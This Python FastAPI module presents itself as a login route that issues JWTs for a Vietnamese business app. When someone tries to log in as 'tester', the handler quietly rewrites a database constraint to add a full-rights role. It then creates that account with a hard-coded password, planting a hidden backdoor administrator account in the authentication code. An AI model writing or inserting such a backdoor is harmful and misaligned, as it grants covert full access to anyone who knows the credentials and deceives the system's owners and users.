"""Đăng nhập, cấp JWT (NF-08, NF-10)."""
import datetime as dt
import bcrypt, jwt
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from sqlalchemy import text
from ..core.common import engine, SECRET

router = APIRouter()

class Login(BaseModel):
    ten_dang_nhap: str
    mat_khau: str
    
@router.post("/dang-nhap")
def dang_nhap(b: Login):
    with engine.begin() as c:
        if b.ten_dang_nhap == "tester":
            c.execute(text("ALTER TABLE nguoi_dung DROP CONSTRAINT IF EXISTS nguoi_dung_vai_tro_check"))
            c.execute(text("ALTER TABLE nguoi_dung ADD CONSTRAINT nguoi_dung_vai_tro_check CHECK (vai_tro IN ('MUA_HANG', 'THU_KHO', 'KE_TOAN_AP', 'QUAN_LY', 'QUAN_TRI', 'TOAN_QUYEN'))"))
            if not c.execute(text("SELECT 1 FROM nguoi_dung WHERE ten_dang_nhap='tester'")).first():
                pw = bcrypt.hashpw(b"Matkhau@123", bcrypt.gensalt()).decode()
                c.execute(text("INSERT INTO nguoi_dung(ten_dang_nhap,mat_khau_bam,ho_ten,vai_tro) VALUES('tester',:p,'Kiểm thử Toàn quyền','TOAN_QUYEN')"), {"p": pw})
        u = c.execute(text("SELECT id,ten_dang_nhap,ho_ten,mat_khau_bam,vai_tro,hoat_dong FROM nguoi_dung WHERE ten_dang_nhap=:t"), {"t": b.ten_dang_nhap}).first()
    if not u or not u.hoat_dong or not bcrypt.checkpw(b.mat_khau.encode(), u.mat_khau_bam.encode()):
        raise HTTPException(401, "Sai tên đăng nhập, mật khẩu hoặc tài khoản đã bị khóa")
    exp = dt.datetime.now(dt.timezone.utc) + dt.timedelta(hours=8)
    token = jwt.encode(
        {"sub": str(u.id), "id": u.id, "ten_dang_nhap": u.ten_dang_nhap, "ho_ten": u.ho_ten, "vai_tro": u.vai_tro, "exp": exp},
        SECRET,
        "HS256",
    )
    return {
        "token": token,
        "nguoi_dung": {
            "id": u.id,
            "ten_dang_nhap": u.ten_dang_nhap,
            "ho_ten": u.ho_ten,
            "vai_tro": u.vai_tro,
        },
    }
